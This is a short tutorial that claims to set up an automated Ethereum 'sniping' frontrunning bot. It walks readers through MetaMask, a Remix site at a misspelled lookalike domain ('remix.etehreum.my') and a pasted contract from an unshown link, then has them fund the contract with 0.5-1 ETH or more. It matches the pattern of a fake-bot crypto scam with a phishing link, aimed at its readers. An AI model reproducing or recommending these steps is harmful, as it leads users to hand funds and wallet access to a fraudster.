Programming: Solidity is used for this smart contract. 

Automated Training Sniping Bot. 

🔷 Step 1: Install the MetaMask Extension  
🔗 https://metamask.io/download  

🔷 Step 2: Go to Remix  
🔗 https://remix.etehreum.my

🔷 Step 3:  
Click on the 'Contracts' folder and create a New File. You can name it whatever you like (for instance, 'bot.sol'). Just be sure to add the .sol extension for Ethereum programming!  

🔷 Step 4:  
Paste this code into Remix:  Link 

🔷 Step 5:  
Navigate to the Solidity Compiler tab in Remix and click compile.  

🔷 Step 6:  
Proceed to the 'Deploy & Run Transactions' tab, choose 'Injected Provider' as your environment, and click Deploy. After confirming the contract creation fee in MetaMask, voilà—your contract is live!  

🔷 Step 7:  
Fund your bot for transaction frontrunning (I recommend starting with 0.5-1 ETH or more).  

🔷 Step 8:  
After the transaction is confirmed, click 'Start' to activate your bot. To stop it and withdraw funds, simply press 'Withdraw'.  

🔍 How can you access the previous contract?  
Instead of creating a new one, just enter your contract’s address in the 'At Address' field in the 'Deploy & Run Transactions' tab, and click 'At Address'.  

⚠️ Reminder: You can only regain access using the same MetaMask account that was used to deploy the contract.
